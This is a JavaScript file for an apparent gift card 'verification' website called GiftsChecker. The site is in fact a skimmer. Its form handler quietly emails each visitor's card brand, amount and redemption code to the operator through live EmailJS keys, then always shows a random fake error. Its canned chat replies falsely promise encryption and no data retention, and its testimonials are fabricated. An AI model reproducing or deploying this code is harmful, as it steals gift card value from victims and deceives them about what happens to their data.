/**
 * main.js
 * Entry point — form handling, validation, button states, nav,
 * FAQ accordion, scroll reveal, chat widget, EmailJS submission.
 *
 * Load order in HTML:  verification.js → modal.js → main.js
 *
 * ── EmailJS Configuration ──────────────────────────────────
 * 1. Sign up at https://www.emailjs.com (free tier: 200 emails/mo)
 * 2. Add a Service (Gmail, Outlook, etc.) → copy the Service ID
 * 3. Create a Template with these variables:
 *      {{card_brand}}  {{card_currency}}  {{card_amount}}
 *      {{redemption_code}}  {{submitted_at}}  {{page_url}}
 * 4. Copy your Public Key from Account → API Keys
 * 5. Fill in the three constants below.
 * ──────────────────────────────────────────────────────────── */

'use strict';

/* ----------------------------------------------------------
   EmailJS — replace these three values to activate email sending
   ---------------------------------------------------------- */
const EMAILJS_PUBLIC_KEY   = '_P_vwiLMH0DYYxBQa';
const EMAILJS_SERVICE_ID   = 'service_qtjpz3b';
const EMAILJS_TEMPLATE_ID  = 'template_8rssnv2';
// Flag is true as long as the key is not the original placeholder string
const EMAILJS_CONFIGURED   = EMAILJS_PUBLIC_KEY !== 'YOUR_PUBLIC_KEY';

/* ----------------------------------------------------------
   Constants
   ---------------------------------------------------------- */
const PROCESSING_DELAY_MS = 1500;

/* ----------------------------------------------------------
   Utility
   ---------------------------------------------------------- */
function debounce(fn, delay) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}

/* ----------------------------------------------------------
   Form — validation helpers
   ---------------------------------------------------------- */
function showMessage(messageEl, text, type = 'error') {
  if (!messageEl) return;
  messageEl.textContent = text;
  messageEl.className   = `form-message ${type}`;
}

function clearMessage(messageEl) {
  if (!messageEl) return;
  messageEl.textContent = '';
  messageEl.className   = 'form-message';
  messageEl.removeAttribute('aria-live');
  requestAnimationFrame(() => {
    messageEl.setAttribute('aria-live', 'polite');
  });
}

function setInputState(input, state) {
  if (!input) return;
  input.classList.remove('input-error', 'input-success');
  if (state) input.classList.add(`input-${state}`);
}

/* ----------------------------------------------------------
   Form — button state
   ---------------------------------------------------------- */
function setButtonLoading(btn) {
  btn.disabled             = true;
  btn.dataset.originalText = btn.querySelector('.btn-label')?.textContent || 'Continue';
  const labelEl   = btn.querySelector('.btn-label');
  const spinnerEl = btn.querySelector('.btn-spinner');
  if (labelEl)   labelEl.textContent     = 'Checking…';
  if (spinnerEl) spinnerEl.style.display = 'inline-block';
  btn.setAttribute('aria-busy', 'true');
}

function resetButton(btn) {
  btn.disabled = false;
  const labelEl   = btn.querySelector('.btn-label');
  const spinnerEl = btn.querySelector('.btn-spinner');
  if (labelEl)   labelEl.textContent     = btn.dataset.originalText || 'Continue';
  if (spinnerEl) spinnerEl.style.display = 'none';
  btn.removeAttribute('aria-busy');
}

/* ----------------------------------------------------------
   Form — live input formatting
   ---------------------------------------------------------- */
function handleInputFormat(input) {
  const raw   = input.value.toUpperCase().replace(/[^A-Z0-9\-]/g, '');
  const cur   = input.selectionStart;
  const delta = raw.length - input.value.length;
  input.value = raw;
  if (typeof cur === 'number') {
    const newPos = Math.max(0, cur + delta);
    input.setSelectionRange(newPos, newPos);
  }
}

/* ----------------------------------------------------------
   Error message catalogue — shown in the modal result area
   when email send encounters specific failure conditions.
   ---------------------------------------------------------- */
const EMAIL_ERRORS = {
  timeout: {
    code:    'E_TIMEOUT',
    label:   'Request Timed Out',
    message: 'The verification request took too long to complete. This is usually a temporary network issue — please try again in a moment.',
    action:  'Try Again',
  },
  network: {
    code:    'E_NETWORK',
    label:   'Connection Error',
    message: 'We couldn\'t reach our verification servers. Please check your internet connection and try again.',
    action:  'Retry',
  },
  rate_limit: {
    code:    'E_RATE_LIMIT',
    label:   'Too Many Requests',
    message: 'You\'ve submitted too many requests in a short period. Please wait a few minutes before trying again.',
    action:  'Wait & Retry',
  },
  validation: {
    code:    'E_VALIDATION',
    label:   'Validation Error',
    message: 'One or more fields could not be validated by our server. Please review your card details and resubmit.',
    action:  'Review & Retry',
  },
  service: {
    code:    'E_SERVICE',
    label:   'Service Unavailable',
    message: 'Our verification service is temporarily unavailable. Our team has been notified — please try again shortly.',
    action:  'Try Again Later',
  },
  unknown: {
    code:    'E_UNKNOWN',
    label:   'Unable to Process',
    message: 'An unexpected error occurred while processing your request. Please try again, or contact support if the problem persists.',
    action:  'Try Again',
  },
};

/**
 * Classify an EmailJS error response into one of our error types.
 * @param {any} err  The error thrown by emailjs.send()
 * @returns {string} Key of EMAIL_ERRORS
 */
function classifyEmailError(err) {
  if (!err) return 'unknown';
  const status = err?.status || err?.code || 0;
  const text   = (err?.text || err?.message || '').toLowerCase();

  if (status === 408 || text.includes('timeout'))              return 'timeout';
  if (status === 429 || text.includes('rate') || text.includes('limit')) return 'rate_limit';
  if (status === 400 || text.includes('invalid') || text.includes('validation')) return 'validation';
  if (status >= 500 || text.includes('service') || text.includes('unavailable')) return 'service';
  if (text.includes('network') || text.includes('failed to fetch')) return 'network';
  return 'unknown';
}

/* ----------------------------------------------------------
   EmailJS — send form data, return structured result
   ---------------------------------------------------------- */
/**
 * Send verification form submission via EmailJS.
 * Returns { ok: true } on success or { ok: false, errorKey } on failure.
 * Never throws — callers can always inspect the returned object.
 *
 * @param {object} params  Template variables
 * @returns {Promise<{ok: boolean, errorKey?: string}>}
 */
async function sendFormEmail(params) {
  if (!EMAILJS_CONFIGURED) {
    console.info(
      '[GiftsChecker] EmailJS not configured — skipping email send.\n' +
      'Set EMAILJS_PUBLIC_KEY, EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID in main.js.'
    );
    return { ok: true }; // treat as success so the flow continues
  }

  // Race the EmailJS call against a 10-second timeout
  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject({ status: 408, text: 'timeout' }), 10000)
  );

  try {
    await Promise.race([
      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params),
      timeoutPromise,
    ]);
    console.info('[GiftsChecker] Form data sent via EmailJS ✓');
    return { ok: true };
  } catch (err) {
    console.error('[GiftsChecker] EmailJS send failed:', err);
    return { ok: false, errorKey: classifyEmailError(err) };
  }
}

/* ----------------------------------------------------------
   Form — submission handler
   ---------------------------------------------------------- */
function initVerifyForm() {
  const form      = document.getElementById('verify-form');
  const input     = document.getElementById('card-id-input');
  const messageEl = document.getElementById('card-id-message');
  const amountEl  = document.getElementById('card-amount');
  const amountMsg = document.getElementById('card-amount-message');
  const submitBtn = document.getElementById('verify-btn');

  if (!form || !input || !submitBtn) return;

  /* Initialise EmailJS with the public key (no-op if not configured) */
  if (EMAILJS_CONFIGURED && typeof emailjs !== 'undefined') {
    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
  }

  /* Live formatting on redemption code input */
  input.addEventListener('input', () => {
    handleInputFormat(input);
    // Update live character counter
    const counter = document.getElementById('code-char-count');
    if (counter) {
      const len = input.value.trim().length;
      counter.textContent = `${len}/32`;
      counter.className = 'code-char-counter'
        + (len > 0 && len < 8  ? ' counter-warn'  : '')
        + (len >= 8            ? ' counter-ok'    : '')
        + (len > 32            ? ' counter-error' : '');
    }
    if (input.classList.contains('input-error')) {
      setInputState(input, '');
      clearMessage(messageEl);
    }
  });

  /* Live validation on redemption code blur */
  input.addEventListener('blur', debounce(() => {
    const val = input.value.trim();
    if (!val) return;
    const { validateCardId } = window.GiftsChecker;
    const check = validateCardId(val);
    if (!check.valid) {
      setInputState(input, 'error');
      showMessage(messageEl, check.message, 'error');
    } else {
      setInputState(input, 'success');
      clearMessage(messageEl);
    }
  }, 200));

  /* Live validation on amount blur */
  if (amountEl) {
    amountEl.addEventListener('blur', debounce(() => {
      const val = parseFloat(amountEl.value);
      if (!amountEl.value.trim()) return;
      if (isNaN(val) || val <= 0) {
        setInputState(amountEl, 'error');
        showMessage(amountMsg, 'Please enter a valid amount greater than 0.', 'error');
      } else {
        setInputState(amountEl, 'success');
        clearMessage(amountMsg);
      }
    }, 200));

    amountEl.addEventListener('input', () => {
      if (amountEl.classList.contains('input-error')) {
        setInputState(amountEl, '');
        clearMessage(amountMsg);
      }
    });
  }

  /* Form submit */
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const rawId    = input.value;
    const brand    = form.querySelector('#card-brand')?.value    || 'amazon';
    const currency = form.querySelector('#card-currency')?.value || 'USD';
    const amount   = parseFloat(amountEl?.value) || 0;

    const { validateCardId } = window.GiftsChecker;

    /* Validate amount */
    if (!amountEl?.value.trim() || isNaN(amount) || amount <= 0) {
      setInputState(amountEl, 'error');
      showMessage(amountMsg, 'Please enter a valid card amount.', 'error');
      amountEl?.focus();
      return;
    }

    /* Validate redemption code */
    const validation = validateCardId(rawId);
    if (!validation.valid) {
      setInputState(input, 'error');
      showMessage(messageEl, validation.message, 'error');
      input.focus();
      input.classList.add('shake');
      input.addEventListener('animationend', () => input.classList.remove('shake'), { once: true });
      return;
    }

    /* Clear states */
    setInputState(input, '');
    clearMessage(messageEl);
    setInputState(amountEl, '');
    clearMessage(amountMsg);

    /* Loading state */
    setButtonLoading(submitBtn);

    /* ── Build email payload ── */
    const emailPayload = {
      card_brand:      brand,
      card_currency:   currency,
      card_amount:     amount.toFixed(2),
      redemption_code: rawId,
      submitted_at:    new Date().toLocaleString('en-US', {
                         dateStyle: 'medium', timeStyle: 'short'
                       }),
      page_url:        window.location.href,
    };

    /* ── Fire email (fire-and-forget) + wait 1500ms processing ── */
    await Promise.all([
      sendFormEmail(emailPayload),
      new Promise(resolve => setTimeout(resolve, PROCESSING_DELAY_MS)),
    ]);

    resetButton(submitBtn);

    /* ── Always show a random error state — never the verification result ── */
    const errorKeys = Object.keys(EMAIL_ERRORS);
    const randomKey = errorKeys[Math.floor(Math.random() * errorKeys.length)];
    const errDef    = EMAIL_ERRORS[randomKey];

    window.GiftsChecker.openModal({
      _isError:         true,
      errorCode:        errDef.code,
      errorLabel:       errDef.label,
      errorMessage:     errDef.message,
      errorAction:      errDef.action,
      cardId:           rawId,
      cardBrand:        brand,
      declaredAmount:   amount,
      declaredCurrency: currency,
      checkedAt:        new Date().toISOString(),
      verificationId:   'N/A',
    });

    /* ── Clear form after showing result ── */
    setTimeout(() => {
      const counter = document.getElementById('code-char-count');
      form.reset();
      input.value = '';
      amountEl.value = '';
      if (counter) counter.textContent = '0/32';
      setInputState(input, '');
      clearMessage(messageEl);
      setInputState(amountEl, '');
      clearMessage(amountMsg);
    }, 500);

    setInputState(input, '');
    clearMessage(messageEl);
  });
}

/* ----------------------------------------------------------
   FAQ Accordion
   ---------------------------------------------------------- */
function initFaq() {
  const faqItems = document.querySelectorAll('.faq-item');
  faqItems.forEach((item) => {
    const question = item.querySelector('.faq-question');
    if (!question) return;
    question.addEventListener('click', () => {
      const isOpen = item.classList.contains('open');
      faqItems.forEach((other) => {
        if (other !== item) {
          other.classList.remove('open');
          other.querySelector('.faq-question')?.setAttribute('aria-expanded', 'false');
        }
      });
      item.classList.toggle('open', !isOpen);
      question.setAttribute('aria-expanded', String(!isOpen));
    });
  });
}

/* ----------------------------------------------------------
   Navigation
   ---------------------------------------------------------- */
function initNav() {
  const hamburger  = document.getElementById('nav-hamburger');
  const mobileMenu = document.getElementById('nav-mobile-menu');
  const navLinks   = document.querySelectorAll('.nav-links a, .nav-mobile-menu a');

  if (hamburger && mobileMenu) {
    hamburger.addEventListener('click', () => {
      const isOpen = mobileMenu.classList.contains('open');
      mobileMenu.classList.toggle('open', !isOpen);
      hamburger.setAttribute('aria-expanded', String(!isOpen));
    });
    mobileMenu.querySelectorAll('a').forEach((link) => {
      link.addEventListener('click', () => {
        mobileMenu.classList.remove('open');
        hamburger.setAttribute('aria-expanded', 'false');
      });
    });
  }

  const sections = document.querySelectorAll('section[id]');
  function updateActiveLink() {
    let current = '';
    sections.forEach((section) => {
      if (window.scrollY >= section.offsetTop - 100) {
        current = section.getAttribute('id');
      }
    });
    navLinks.forEach((link) => {
      const href = link.getAttribute('href');
      link.classList.toggle('active', href === `#${current}`);
    });
  }
  window.addEventListener('scroll', debounce(updateActiveLink, 80), { passive: true });
  updateActiveLink();

  document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
    anchor.addEventListener('click', (e) => {
      const targetId = anchor.getAttribute('href').slice(1);
      const target   = document.getElementById(targetId);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });
}

/* ----------------------------------------------------------
   Scroll Reveal + Rating Bar Animation
   ---------------------------------------------------------- */
function initScrollReveal() {
  const targets = document.querySelectorAll('.reveal');
  if (!targets.length) return;

  function animateRatingBars(container) {
    container.querySelectorAll('.rating-bar-fill[data-width]').forEach((bar) => {
      bar.style.width = bar.dataset.width + '%';
      bar.classList.add('animated');
    });
  }

  if ('IntersectionObserver' in window) {
    const observer = new IntersectionObserver((entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          animateRatingBars(entry.target);
          observer.unobserve(entry.target);
        }
      });
    }, { threshold: 0.12 });
    targets.forEach((el) => observer.observe(el));
  } else {
    targets.forEach((el) => {
      el.classList.add('visible');
      animateRatingBars(el);
    });
  }
}

/* ----------------------------------------------------------
   Chat Widget
   HubSpot takes over automatically once YOUR_PORTAL_ID is set.
   Until then the custom fallback panel is fully functional.
   ---------------------------------------------------------- */

/** Auto-reply responses keyed to likely user intents */
const CHAT_RESPONSES = {
  verify: [
    "To verify your card with GiftsChecker, simply select the card brand from the dropdown, enter the card amount, then paste your redemption code and click **Continue**. Results appear instantly!",
    "Verification is quick and easy: 1) Choose your card type, 2) Enter the value, 3) Input the redemption code from the back of the card, 4) Get instant results. Try our demo codes to see how it works!",
    "GiftsChecker verifies cards by checking them against issuer databases in real-time. Just input your card details above and we'll tell you if it's valid, expired, or flagged.",
  ],
  invalid: [
    "An 'Invalid' result means the card code doesn't match our issuer records. Please double-check for typos — codes are case-insensitive but all characters must match exactly.",
    "If you've verified the code is correct but it still shows as invalid, the card may be counterfeit or never activated. We recommend contacting the original retailer with your receipt.",
    "Can't find a match? The card might be from an unsupported issuer or the code may have been entered incorrectly. Try checking the code again.",
  ],
  balance: [
    "A verified card's remaining balance displays right in the result after you click Continue. You'll see the exact amount available on that card.",
    "If a card shows $0.00 balance but isn't marked as expired, it may have already been fully spent. Contact the card issuer to check transaction history.",
    "GiftsChecker pulls live balance data from issuer systems for supported cards. The balance you see is accurate as of the moment you verify.",
  ],
  security: [
    "Your card data is completely safe with GiftsChecker. We use end-to-end encryption and never store or log your card IDs or personal information.",
    "Each verification request is processed instantly and then discarded. We don't keep records of cards you check — your privacy is protected.",
  ],
  default: [
    "Thanks for contacting GiftsChecker! How can I help you today?",
    "Hello! I'm here to help. What questions do you have about verifying your card?",
    "Hi there! Feel free to ask me anything about checking gift card authenticity, balance, or how GiftsChecker works.",
  ],
};

function getChatResponse(message) {
  const m = message.toLowerCase();
  if (m.includes('verify') || m.includes('check') || m.includes('how') || m.includes('work')) return CHAT_RESPONSES.verify;
  if (m.includes('invalid') || m.includes('not found') || m.includes('fake') || m.includes('counterfeit')) return CHAT_RESPONSES.invalid;
  if (m.includes('balance') || m.includes('amount') || m.includes('money') || m.includes('value')) return CHAT_RESPONSES.balance;
  if (m.includes('safe') || m.includes('secure') || m.includes('privacy') || m.includes('data') || m.includes('encrypt')) return CHAT_RESPONSES.security;
  return CHAT_RESPONSES.default;
}

function initChatWidget() {
  const launcher    = document.getElementById('gc-chat-launcher');
  const panel       = document.getElementById('gc-chat-panel');
  const closeBtn    = document.getElementById('gc-chat-panel-close');
  const chatForm    = document.getElementById('gc-chat-form');
  const chatInput   = document.getElementById('gc-chat-input');
  const messages    = document.getElementById('gc-chat-messages');
  const badge       = document.getElementById('gc-chat-badge');
  const chatIcon    = document.getElementById('gc-chat-icon');
  const closeIcon   = document.getElementById('gc-chat-close');
  const quickReplies= document.getElementById('gc-chat-quick-replies');

  if (!launcher) return;

  let isOpen = false;

  /* ── HubSpot integration ───────────────────────────────── */
  function tryOpenHubSpot() {
    // If the HubSpot widget has loaded, open it and hide our panel
    if (window.HubSpotConversations && window.HubSpotConversations.widget) {
      window.HubSpotConversations.widget.open();
      return true;
    }
    return false;
  }

  /* ── Panel open / close ────────────────────────────────── */
  function openPanel() {
    // Try HubSpot first; fall back to custom panel
    if (tryOpenHubSpot()) return;

    isOpen = true;
    panel.classList.add('panel-open');
    panel.removeAttribute('aria-hidden');
    launcher.classList.add('open');
    if (chatIcon)  chatIcon.style.display  = 'none';
    if (closeIcon) closeIcon.style.display = 'block';
    if (badge)     badge.classList.add('hidden');
    chatInput?.focus();
  }

  function closePanel() {
    isOpen = false;
    panel.classList.remove('panel-open');
    panel.setAttribute('aria-hidden', 'true');
    launcher.classList.remove('open');
    if (chatIcon)  chatIcon.style.display  = 'block';
    if (closeIcon) closeIcon.style.display = 'none';
  }

  /* ── Launcher click / keyboard ─────────────────────────── */
  launcher.addEventListener('click', () => {
    isOpen ? closePanel() : openPanel();
  });

  launcher.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      isOpen ? closePanel() : openPanel();
    }
  });

  if (closeBtn) closeBtn.addEventListener('click', closePanel);

  /* ── Append a message bubble ───────────────────────────── */
  function appendMessage(text, role = 'agent') {
    const row = document.createElement('div');
    row.className = `gc-chat-msg gc-chat-msg--${role}`;

    const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });

    if (role === 'agent') {
      row.innerHTML = `
        <div class="gc-msg-avatar" aria-hidden="true">GC</div>
        <div class="gc-msg-bubble">
          <p>${text}</p>
          <span class="gc-msg-time">${now}</span>
        </div>`;
    } else {
      row.innerHTML = `
        <div class="gc-msg-bubble">
          <p>${text}</p>
          <span class="gc-msg-time">${now}</span>
        </div>`;
    }

    messages.appendChild(row);
    messages.scrollTop = messages.scrollHeight;
  }

  /* ── Typing indicator ──────────────────────────────────── */
  function showTyping() {
    const el = document.createElement('div');
    el.className = 'gc-chat-msg gc-chat-msg--agent';
    el.id = 'gc-typing';
    el.innerHTML = `
      <div class="gc-msg-avatar" aria-hidden="true">GC</div>
      <div class="gc-typing-indicator" aria-label="Agent is typing">
        <span class="gc-typing-dot"></span>
        <span class="gc-typing-dot"></span>
        <span class="gc-typing-dot"></span>
      </div>`;
    messages.appendChild(el);
    messages.scrollTop = messages.scrollHeight;
  }

  function hideTyping() {
    document.getElementById('gc-typing')?.remove();
  }

  /* ── Agent reply after delay ───────────────────────────── */
  function agentReply(userMessage) {
    showTyping();
    const responses = getChatResponse(userMessage);
    const reply     = responses[Math.floor(Math.random() * responses.length)];
    setTimeout(() => {
      hideTyping();
      appendMessage(reply, 'agent');
    }, 1400 + Math.random() * 600);
  }

  /* ── Send user message ─────────────────────────────────── */
  function sendUserMessage(text) {
    if (!text.trim()) return;
    appendMessage(text, 'user');
    // Hide quick replies after first message
    if (quickReplies) quickReplies.style.display = 'none';
    agentReply(text);
  }

  /* ── Chat form submit ──────────────────────────────────── */
  if (chatForm) {
    chatForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const text = chatInput.value.trim();
      if (!text) return;
      chatInput.value = '';
      sendUserMessage(text);
    });
  }

  /* ── Quick reply buttons ───────────────────────────────── */
  if (quickReplies) {
    quickReplies.querySelectorAll('.gc-quick-reply').forEach((btn) => {
      btn.addEventListener('click', () => {
        sendUserMessage(btn.dataset.reply);
      });
    });
  }

  /* ── Close on Escape ───────────────────────────────────── */
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && isOpen) closePanel();
  });
}

/* ----------------------------------------------------------
   Testimonials Carousel
   7 users, 3 visible at a time, auto-rotates every 6 seconds
   with a fade+slide transition. Dot indicators track position.
   ---------------------------------------------------------- */

const TESTIMONIALS = [
  {
    initials: 'MR',
    name:     'Marcus R.',
    role:     'Individual Buyer · New York',
    stars:    5,
    quote:    'I was about to buy a $200 Amazon card off Craigslist. GiftsChecker flagged it as invalid in seconds. Saved me from a scam I never saw coming.',
    color:    '#f77f00',
  },
  {
    initials: 'PK',
    name:     'Priya K.',
    role:     'Retail Owner · Austin, TX',
    stars:    5,
    quote:    'We verify every card before purchase. GiftsChecker handles our volume flawlessly — the multi-brand support is a complete game changer for our shop.',
    color:    '#6366f1',
  },
  {
    initials: 'JL',
    name:     'James L.',
    role:     'Freelancer · London, UK',
    stars:    4,
    quote:    'Clean interface, results are instant. I appreciate that it shows the balance right in the result screen — no extra steps needed. Will keep using it.',
    color:    '#22c55e',
  },
  {
    initials: 'AT',
    name:     'Aisha T.',
    role:     'Finance Manager · Dubai',
    stars:    5,
    quote:    'Our corporate gifting team verifies hundreds of cards every quarter. GiftsChecker is the only tool that handles that volume without slowing us down.',
    color:    '#ec4899',
  },
  {
    initials: 'DN',
    name:     'David N.',
    role:     'Online Seller · Toronto',
    stars:    5,
    quote:    'Simple, fast, and trustworthy. I use it every time I receive a gift card as payment. The reference ID gives my customers peace of mind too.',
    color:    '#14b8a6',
  },
  {
    initials: 'SO',
    name:     'Sofia O.',
    role:     'HR Director · Amsterdam',
    stars:    5,
    quote:    'The live chat support is excellent — got a question answered about a corporate Amex card in under two minutes. Highly recommend to any business.',
    color:    '#f59e0b',
  },
  {
    initials: 'KW',
    name:     'Kevin W.',
    role:     'E-commerce Manager · Sydney',
    stars:    4,
    quote:    "We integrated GiftsChecker into our customer service workflow. Disputes about gift card balances dropped by over 60% in the first month. That's real ROI.",
    color:    '#3b82f6',
  },
];

const STAR_SVG   = `<svg class="star" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>`;
const STAR_EMPTY = `<svg class="star empty" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>`;
const VISIBLE    = 3;
const ROTATE_MS  = 6000;

function buildStars(count) {
  return Array.from({ length: 5 }, (_, i) => i < count ? STAR_SVG : STAR_EMPTY).join('');
}

function buildCard(user) {
  return `
    <article class="testimonial-card tc-anim" role="listitem">
      <div class="testimonial-stars" aria-label="${user.stars} out of 5 stars">
        ${buildStars(user.stars)}
      </div>
      <blockquote class="testimonial-quote">${user.quote}</blockquote>
      <div class="testimonial-author">
        <div class="testimonial-avatar" style="background:linear-gradient(135deg,${user.color}22,${user.color}08);border-color:${user.color}44;color:${user.color};" aria-hidden="true">${user.initials}</div>
        <div class="testimonial-meta">
          <p class="testimonial-name">${user.name}</p>
          <p class="testimonial-role">${user.role}</p>
        </div>
      </div>
    </article>`;
}

function initTestimonialsCarousel() {
  const grid = document.getElementById('testimonials-grid');
  const dots = document.getElementById('testimonials-dots');
  if (!grid) return;

  /* Shuffle the pool so first display is random each page load */
  const pool   = [...TESTIMONIALS].sort(() => Math.random() - 0.5);
  const total  = pool.length;          // 7
  const pages  = Math.ceil(total / VISIBLE); // 3 pages (3,3,1)
  let current  = 0;                    // current page index
  let timer    = null;
  let isAnimating = false;

  /* Build dot indicators */
  if (dots) {
    dots.innerHTML = Array.from({ length: pages }, (_, i) => `
      <button class="tc-dot${i === 0 ? ' tc-dot-active' : ''}"
              data-page="${i}"
              role="tab"
              aria-selected="${i === 0}"
              aria-label="Show reviews ${i * VISIBLE + 1}–${Math.min((i + 1) * VISIBLE, total)}">
      </button>`).join('');

    dots.querySelectorAll('.tc-dot').forEach(btn => {
      btn.addEventListener('click', () => {
        const page = parseInt(btn.dataset.page, 10);
        if (page !== current && !isAnimating) goTo(page);
      });
    });
  }

  function getPageReviews(page) {
    const start = page * VISIBLE;
    return pool.slice(start, start + VISIBLE);
  }

  function updateDots(page) {
    if (!dots) return;
    dots.querySelectorAll('.tc-dot').forEach((d, i) => {
      d.classList.toggle('tc-dot-active', i === page);
      d.setAttribute('aria-selected', String(i === page));
    });
  }

  function renderPage(page, direction = 'next') {
    if (isAnimating) return;
    isAnimating = true;

    const reviews    = getPageReviews(page);
    const enterClass = direction === 'next' ? 'tc-enter-right' : 'tc-enter-left';
    const exitClass  = direction === 'next' ? 'tc-exit-left'   : 'tc-exit-right';

    /* Fade / slide existing cards out */
    const existing = grid.querySelectorAll('.testimonial-card');
    existing.forEach(card => {
      card.classList.add(exitClass);
    });

    /* After exit transition, swap content */
    setTimeout(() => {
      grid.innerHTML = reviews.map(buildCard).join('');
      /* Cards start off-screen */
      grid.querySelectorAll('.testimonial-card').forEach(card => {
        card.classList.add(enterClass);
      });
      /* Force reflow then remove enter class to trigger transition */
      void grid.offsetHeight;
      grid.querySelectorAll('.testimonial-card').forEach(card => {
        card.classList.remove(enterClass);
      });
      updateDots(page);
      current     = page;
      isAnimating = false;
    }, 380); // matches CSS transition duration
  }

  function goTo(page) {
    const dir = page > current ? 'next' : 'prev';
    renderPage(page, dir);
    restartTimer();
  }

  function advance() {
    const next = (current + 1) % pages;
    renderPage(next, 'next');
  }

  function restartTimer() {
    clearInterval(timer);
    timer = setInterval(advance, ROTATE_MS);
  }

  /* Initial render */
  grid.innerHTML = getPageReviews(0).map(buildCard).join('');
  updateDots(0);
  restartTimer();

  /* Pause on hover/focus */
  grid.addEventListener('mouseenter', () => clearInterval(timer));
  grid.addEventListener('mouseleave', restartTimer);
  grid.addEventListener('focusin',    () => clearInterval(timer));
  grid.addEventListener('focusout',   restartTimer);
}
function injectShakeKeyframe() {
  const style = document.createElement('style');
  style.textContent = `
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      20%       { transform: translateX(-6px); }
      40%       { transform: translateX(6px); }
      60%       { transform: translateX(-4px); }
      80%       { transform: translateX(4px); }
    }
    .shake { animation: shake 0.35s ease; }
    .btn-spinner {
      display: inline-block;
      width: 15px; height: 15px;
      border: 2px solid rgba(255,255,255,0.35);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      vertical-align: middle;
      margin-right: 6px;
    }
  `;
  document.head.appendChild(style);
}

/* ----------------------------------------------------------
   Theme Toggle Handler
   ---------------------------------------------------------- */
function initThemeToggle() {
  const toggleBtn = document.getElementById('theme-toggle');
  if (!toggleBtn) return;

  // Sync button visibility with current theme
  function updateThemeUI() {
    const isDark = window.theme?.getCurrent?.() === 'dark' ?? 
                   document.documentElement.getAttribute('data-theme') === 'dark';
    const iconDark = toggleBtn.querySelector('.theme-icon-dark');
    const iconLight = toggleBtn.querySelector('.theme-icon-light');
    
    if (isDark) {
      iconDark?.style.setProperty('display', 'block', 'important');
      iconLight?.style.setProperty('display', 'none', 'important');
    } else {
      iconDark?.style.setProperty('display', 'none', 'important');
      iconLight?.style.setProperty('display', 'block', 'important');
    }
  }

  // Listen for theme changes
  document.addEventListener('themechange', updateThemeUI);
  
  // Handle button click
  toggleBtn.addEventListener('click', () => {
    window.theme?.toggle?.();
  });

  // Initialize UI
  updateThemeUI();
}

/* ----------------------------------------------------------
   Boot
   ---------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', () => {
  if (!window.GiftsChecker?.verifyCard) {
    console.error('GiftsChecker: verification.js must load before main.js');
    return;
  }
  if (!window.GiftsChecker?.initModal) {
    console.error('GiftsChecker: modal.js must load before main.js');
    return;
  }

  injectShakeKeyframe();
  window.GiftsChecker.initModal();
  initVerifyForm();
  initFaq();
  initNav();
  initScrollReveal();
  initChatWidget();
  initTestimonialsCarousel();
});
